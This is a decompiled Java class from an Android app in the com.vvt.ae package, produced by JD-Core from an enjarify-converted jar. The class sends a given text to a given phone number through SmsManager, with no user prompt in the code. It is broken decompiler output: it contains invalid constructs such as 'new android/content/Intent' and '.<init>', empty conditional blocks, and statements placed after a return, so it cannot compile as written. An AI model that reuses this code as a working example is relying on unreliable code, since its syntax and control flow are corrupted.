package com.vvt.ae;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import java.util.ArrayList;

public class c
  implements e
{
  private static final boolean a = com.vvt.ak.a.a;
  private String b;
  private String c;
  private Context d;
  
  public c(String paramString1, String paramString2, Context paramContext)
  {
    this.b = paramString1;
    this.c = paramString2;
    this.d = paramContext;
  }
  
  public boolean a()
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    SmsManager localSmsManager = SmsManager.getDefault();
    String str = this.c;
    Object localObject1 = localSmsManager.divideMessage(str);
    boolean bool2 = a;
    if (bool2) {}
    int j = ((ArrayList)localObject1).size();
    Object localObject2;
    if (j > i)
    {
      str = this.b;
      localObject2 = null;
      localSmsManager.sendMultipartTextMessage(str, null, (ArrayList)localObject1, null, null);
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      bool1 = a;
      if (bool1) {}
      return i;
      boolean bool3 = com.vvt.aa.a.b();
      if (bool3)
      {
        localObject1 = this.d;
        localObject2 = new android/content/Intent;
        ((Intent)localObject2).<init>("SMS_SENT");
        localObject2 = PendingIntent.getBroadcast((Context)localObject1, 0, (Intent)localObject2, 0);
        str = this.b;
        localObject1 = this.c;
        localSmsManager.sendTextMessage(str, null, (String)localObject1, (PendingIntent)localObject2, null);
      }
      else
      {
        str = this.b;
        localObject1 = this.c;
        localObject2 = null;
        localSmsManager.sendTextMessage(str, null, (String)localObject1, null, null);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/ae/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */